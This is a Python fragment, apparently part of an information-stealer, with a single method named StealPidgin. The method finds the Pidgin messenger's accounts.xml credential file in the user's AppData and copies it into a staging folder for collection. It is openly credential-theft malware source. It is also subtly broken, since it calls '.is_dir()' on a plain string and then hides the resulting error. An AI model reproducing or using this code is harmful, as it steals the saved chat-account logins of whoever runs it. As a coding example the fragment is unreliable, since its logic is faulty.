import os
import shutil


async def StealPidgin(self, directory_path: str) -> None:
    try:
        pidgin_folder = os.path.join(self.appdata, '.purple', "accounts.xml")
        if os.path.exists(pidgin_folder):
            pidgin_accounts = os.path.join(directory_path, "Messenger", "Pidgin")
            os.makedirs(pidgin_accounts, exist_ok=True)
            if pidgin_folder.is_dir():
                shutil.copytree(pidgin_folder, pidgin_accounts, dirs_exist_ok=True)
            else:
                shutil.copy2(pidgin_folder, pidgin_accounts)
            if len(os.listdir(pidgin_accounts)) == 0:
                os.rmdir(pidgin_accounts)
    except Exception as e:
        print(f"pidgin error - {str(e)}")
        pass